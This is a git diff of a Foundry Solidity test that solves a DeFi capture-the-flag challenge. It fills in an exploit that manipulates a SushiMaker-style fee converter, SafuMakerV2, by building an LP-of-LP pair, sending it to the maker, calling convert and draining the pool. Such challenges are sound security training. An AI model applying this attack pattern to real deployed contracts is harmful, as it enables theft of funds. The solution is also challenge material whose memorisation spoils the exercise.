@@ -37,6 +37,7 @@ contract Testing is Test {
         // deploying token contracts
         vm.prank(admin);
         usdc = new Token("USDC", "USDC");
+        vm.label(address(usdc), "usdc");
 
         address[] memory addresses = new address[](2);
         uint256[] memory amounts = new uint256[](2);
@@ -50,6 +51,7 @@ contract Testing is Test {
 
         vm.prank(admin);
         safu = new Token("SAFU", "SAFU");
+        vm.label(address(safu), "safu");
 
         addresses[0] = admin;
         addresses[1] = attacker;
@@ -66,12 +68,14 @@ contract Testing is Test {
                 abi.encode(admin)
             )
         );
+        vm.label(address(safuFactory), "safuFactory");
         safuRouter = IUniswapV2Router02(
             deployCode(
                 "src/other/uniswap-build/UniswapV2Router02.json",
                 abi.encode(address(safuFactory), address(weth))
             )
         );
+        vm.label(address(safuRouter), "safuRouter");
 
         vm.prank(admin);
         safuMaker = new SafuMakerV2(
@@ -80,6 +84,7 @@ contract Testing is Test {
             address(safu),
             address(usdc)
         );
+        vm.label(address(safuMaker), "safuMaker");
         vm.prank(admin);
         safuFactory.setFeeTo(address(safuMaker));
 
@@ -105,6 +110,7 @@ contract Testing is Test {
         safuPair = IUniswapV2Pair(
             safuFactory.getPair(address(usdc), address(safu))
         );
+        vm.label(address(safuPair), "safuPair");
 
         // --simulates trading activity, as LP is issued to feeTo address for trading rewards
         vm.prank(admin);
@@ -115,10 +121,74 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        address safuRouterAddress = address(safuRouter);
+        uint256 maxVal = type(uint256).max;
+        usdc.approve(safuRouterAddress, maxVal);
+        safu.approve(safuRouterAddress, maxVal);
+        safuRouter.addLiquidity(
+            address(usdc),
+            address(safu),
+            10e18,
+            10e18,
+            0,
+            0,
+            attacker,
+            block.timestamp
+        );
 
-        vm.stopPrank();
+        safuPair.approve(safuRouterAddress, maxVal);
+        safuRouter.addLiquidity(
+            address(safuPair),
+            address(safu),
+            10e18,
+            100,
+            0,
+            0,
+            attacker,
+            block.timestamp
+        );
+        address myPair = safuFactory.getPair(address(safuPair), address(safu));
+        uint myPairBalance = IUniswapV2Pair(myPair).balanceOf(attacker);
+        IUniswapV2Pair(myPair).transfer(address(safuMaker), myPairBalance / 10);
+        safuMaker.convert(address(safuPair), address(safu));
+
+        // swapping into attack LP pool to get most of the safuPair LP tokens
+        // remove liquidity is better than swap, done for laziness bc underflow
+        address[] memory addresses = new address[](2);
+        addresses[0] = address(safu);
+        addresses[1] = address(safuPair);
+
+        safuRouter.swapExactTokensForTokens(
+            1e18,
+            0,
+            addresses,
+            attacker,
+            block.timestamp
+        );
+
+        // removing liquidity for the safuPair LP - receive USDC & SAFU
+        safuRouter.removeLiquidity(
+            address(usdc),
+            address(safu),
+            safuPair.balanceOf(attacker),
+            0,
+            0,
+            attacker,
+            block.timestamp
+        );
+
         validation();
+    }
+
+    function _logPairReserves(address _pair) internal view {
+        (uint112 r0, uint112 r1, ) = IUniswapV2Pair(_pair).getReserves();
+        console.log("r0:", r0);
+        console.log("r1:", r1);
+    }
+
+    function _logPairBalance(address _pair, address _from) internal view {
+        uint bal = IUniswapV2Pair(_pair).balanceOf(_from);
+        console.log("lp-balance:", bal);
     }
 
     /// expected final state
